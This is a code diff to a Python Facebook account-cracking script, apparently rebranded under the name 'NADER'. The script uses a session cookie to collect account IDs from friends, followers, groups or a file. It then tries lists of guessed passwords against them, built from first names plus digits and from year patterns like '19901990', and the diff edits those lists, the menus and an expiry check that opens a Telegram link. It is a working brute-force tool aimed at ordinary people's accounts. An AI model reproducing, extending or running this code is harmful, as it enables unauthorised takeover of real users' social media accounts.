@@ -14,7 +14,7 @@ t=(mm + "/" + dd + "/" + yyyy + " " + hour + ":" + mi + ":" + ss)
 
 hours = (now.hour)
 x = datetime.datetime.now()
-g= datetime.datetime(2023, 10, 7, 12, 10 ,9)
+g= datetime.datetime(2023, 8, 30, 12, 10 ,9)
 
 
 if (x.strftime("%x"))>(g.strftime("%x")):
@@ -46,7 +46,7 @@ if (x.strftime("%x"))>(g.strftime("%x")):
  webbrowser.open('https://t.me/nader20090')
  exit()
  open(".token.txt", "w").write(' . . . .')
- print(x) 
+ print(x)
 import requests,bs4,json,os,sys,random,datetime,time,re
 import urllib3,rich,base64
 from rich.table import Table as me
@@ -376,7 +376,7 @@ class Login:
         print('')
         print('')
         try:
-            cok = input("\033[1;32m[<🟢>] cookie >> ")
+            cok = input("[<>] cookie >> ")
             link = self.ses.get(f"{self.url}/profile.php?v=info", cookies={"cookie": cok}).text
             if 'href="/zero/optin/write/' in str(link):
                 print("[<>] notice: anda sedang menggunakan mode free facebook")
@@ -470,7 +470,7 @@ class Login:
         
 
 
-        ykh = input(f"{H}[{M}+{H}]{N} NADER ")
+        ykh = input(f"{H}[{M}+{H}]{N} HINI ")
         if ykh in ["", " "]:
             print("[!] jangan kosong");time.sleep(2);self.menu()
         elif ykh in ["1", "01"]:
@@ -561,7 +561,7 @@ class Login:
 {02} check result cp
 {00} back to menu
 -----------------------------------------------------""")
-        ykh = input(f"{H}[{M}+{H}]{N} NADER ")
+        ykh = input(f"{H}[{M}+{H}]{N} HINI ")
         if ykh in ["", " "]:
             print("[!] jangan kosong");time.sleep(2);self.menu()
         elif ykh in ["1", "01"]:
@@ -733,7 +733,7 @@ def back():
 	llogin()
 
 def banner():
-	print(f'''\033[1;32m⋘VIP⋙''')
+	print(f'''⋘NADER⋙''')
 
 def llogin():
 	try:
@@ -820,27 +820,25 @@ def login_lagi334():
 	except:pass
 
 
-# NADER
+# HANI
 
 def menu(my_name,my_id):
 	ip = requests.get("https://api.ipify.org").text
 	
 	os.system('clear')
 	banner()
-	print(f'''\033[1;32m[ N A D E R ] = = > @N_0_N_7''')
+	
+	print('\033[1;32mTelegram ᯼ @N_0_N_7')
+	print('[NADER]')
+	print(f'\033[1;32m»  Your ID : '+str(my_id))
+	print(f'\033[1;32m»  Your IP : {ip}')
 	print('')
-	print('''          \033[1;31m- \033[1;32m- \033[1;33m- \033[1;34m- \033[1;35m- \033[1;36m- \033[1;31m- \033[1;32m- \033[1;33m- \033[1;34m- \033[1;35m- \033[1;36m- \033[1;31m- \033[1;32m- \033[1;33m-\033[1;34m - \033[1;35m- \033[1;36m- \033[1;31m- \033[1;32m- \033[1;33m- \033[1;34m-''')
-	print('''          \033[1;32m[N] : [1] :صيد من اصدقاء''')
-	print('''          \033[1;31m- \033[1;32m- \033[1;33m- \033[1;34m- \033[1;35m- \033[1;36m- \033[1;31m- \033[1;32m- \033[1;33m- \033[1;34m- \033[1;35m- \033[1;36m- \033[1;31m- \033[1;32m- \033[1;33m-\033[1;34m - \033[1;35m- \033[1;36m- \033[1;31m- \033[1;32m- \033[1;33m- \033[1;34m-''')
-	print('''          \033[1;32m[N] : [2] :صيد من متابعين''')
-	print('''          \033[1;31m- \033[1;32m- \033[1;33m- \033[1;34m- \033[1;35m- \033[1;36m- \033[1;31m- \033[1;32m- \033[1;33m- \033[1;34m- \033[1;35m- \033[1;36m- \033[1;31m- \033[1;32m- \033[1;33m-\033[1;34m - \033[1;35m- \033[1;36m- \033[1;31m- \033[1;32m- \033[1;33m- \033[1;34m-''')
-	print('''          \033[1;32m[N] : [3] :صيد من جروبات''')
-	print('''          \033[1;31m- \033[1;32m- \033[1;33m- \033[1;34m- \033[1;35m- \033[1;36m- \033[1;31m- \033[1;32m- \033[1;33m- \033[1;34m- \033[1;35m- \033[1;36m- \033[1;31m- \033[1;32m- \033[1;33m-\033[1;34m - \033[1;35m- \033[1;36m- \033[1;31m- \033[1;32m- \033[1;33m- \033[1;34m-''')
-	print('''          \033[1;32m[N] : [4] :صيد من ملف''')
-	print('''          \033[1;31m- \033[1;32m- \033[1;33m- \033[1;34m- \033[1;35m- \033[1;36m- \033[1;31m- \033[1;32m- \033[1;33m- \033[1;34m- \033[1;35m- \033[1;36m- \033[1;31m- \033[1;32m- \033[1;33m-\033[1;34m - \033[1;35m- \033[1;36m- \033[1;31m- \033[1;32m- \033[1;33m- \033[1;34m-''')
-	print('''          \033[1;32m[N] : [0] :تغيير cookies  لعدم التصفير''')
-	print('''          \033[1;31m- \033[1;32m- \033[1;33m- \033[1;34m- \033[1;35m- \033[1;36m- \033[1;31m- \033[1;32m- \033[1;33m- \033[1;34m- \033[1;35m- \033[1;36m- \033[1;31m- \033[1;32m- \033[1;33m-\033[1;34m - \033[1;35m- \033[1;36m- \033[1;31m- \033[1;32m- \033[1;33m- \033[1;34m-''')
-	_____alvino__adijaya_____ = input('''    \033[1;32m  \n>> chose : ''')
+	print('\033[1;32m» 1- Fishing from friends : من الاصدقاء  ')
+	print('\033[1;32m» 2- Fishing from followers : من المتابعين ')
+	print('\033[1;32m» 3- Crack File : مــن مــلــف  ')		
+	print('\033[1;32m» 0- login out : تسجيل خروج   ')
+		
+	_____alvino__adijaya_____ = input('\033[1;32m\n[=] chose : ')
 	if _____alvino__adijaya_____ in ['1']:
 		dump_massal()
 	elif _____alvino__adijaya_____ in ['2']:
@@ -963,12 +961,12 @@ def dump_massal():
 		back()
 
 def setting():
-	#print("\033[2;36m ~~~~~~~~~~~~~~~~~~~~~~~")
-	#print(f'» 1- Id old | الاولويه في الفحص للحسابات القديمه')
-	#print('» 2- Id New | الاولويه في الفحص للحسابات الجديده')
-	#print('» 3- Old+new | قـديـمـه وجـديده ')
+	print("\033[2;36m ~~~~~~~~~~~~~~~~~~~~~~~")
+	print(f'» 1- Id old | الاولويه في الفحص للحسابات القديمه')
+	print('» 2- Id New | الاولويه في الفحص للحسابات الجديده')
+	print('» 3- Old+new | قـديـمـه وجـديده ')
 	print('')
-	hu = ('3')
+	hu = input('» Chose : ')
 	if hu in ['1','01']:
 		for tua in sorted(id):
 			id2.append(tua)
@@ -989,12 +987,12 @@ def setting():
 	else:
 		print('>> PILIH YANG BENAR BANG ')
 		exit()
-	#print('>> 1. Mobile ')
+	print('>> 1. Mobile ')
 #    print('>> 2. Mbasic ')
 #    print('>> 3. Touch  ')
 #    print('>> 4. Mtouch ')
 	print('')
-	hc = ('1')
+	hc = input('» Chose : ')
 	if hc in ['1','01']:
 		method.append('mobile')
 	elif hc in ['']:
@@ -1009,7 +1007,7 @@ def setting():
 	else:
 		method.append('mobile')
 	print('')
-	_jembot_ = ('Y')
+	_jembot_ = input('>> Add App : اظهار التطبيقات المرتبطه ( Y/t ) ')
 	if _jembot_ in ['']:
 		print('>> Pilih Yang Bener Kontol ')
 		back()
@@ -1017,7 +1015,7 @@ def setting():
 		taplikasi.append('ya')
 	else:
 		taplikasi.append('no')
-	pwplus=('T')
+	pwplus=input('>> Password Manual : باسورد يدوي (T عشوائي)( Y/t ) ')
 	if pwplus in ['y','Y']:
 		pwpluss.append('ya')
 		cetak(nel('[[cyan]•[white]] Masukkan Katasandi Tambahan Minimal 6 Karakter\n[[cyan]•[white]] Contoh :[green] kakak,ngentod,adik[white] '))
@@ -1046,18 +1044,22 @@ def passwrd():
 					pwv.append(frs+'12345')
 					pwv.append('112233445566')
 					pwv.append('1122334455')
-					pwv.append('123456')
+					pwv.append(frs+'123456')
 					pwv.append('1234512345')
 					pwv.append('00998877')
 					pwv.append('11223344')
 					pwv.append('11223344556677')
 					pwv.append('qqwweerr')
-					pwv.append(frs+'123456')
+					pwv.append('19901990')
+					pwv.append('19911991')
+					pwv.append('19921992')
 					pwv.append(frs+'1234567')
 					pwv.append(frs+'12345678')
 					pwv.append(frs+'123456789')
-					pwv.append(frs+'1234567890')
-			else:
+					pwv.append('19961996')
+					pwv.append('19971997')
+					pwv.append('19981998')
+					pwv.append('19991999')
 				if len(frs)<3:
 					pwv.append(nmf)
 				else:
@@ -1067,17 +1069,22 @@ def passwrd():
 					pwv.append(frs+'12345')
 					pwv.append('112233445566')
 					pwv.append('1122334455')
-					pwv.append('123456')
+					pwv.append(frs+'123456')
 					pwv.append('1234512345')
 					pwv.append('00998877')
 					pwv.append('11223344')
 					pwv.append('11223344556677')
 					pwv.append('qqwweerr')
-					pwv.append(frs+'123456')
+					pwv.append('19901990')
+					pwv.append('19911991')
+					pwv.append('19921992')
 					pwv.append(frs+'1234567')
 					pwv.append(frs+'12345678')
 					pwv.append(frs+'123456789')
-					pwv.append(frs+'1234567890')
+					pwv.append('19961996')
+					pwv.append('19971997')
+					pwv.append('19981998')
+					pwv.append('19991999')
 			if 'ya' in pwpluss:
 				for xpwd in pwnya:
 					pwv.append(xpwd)
@@ -1274,4 +1281,3 @@ if __name__=='__main__':
 	except:pass
 	
 	Login()
-
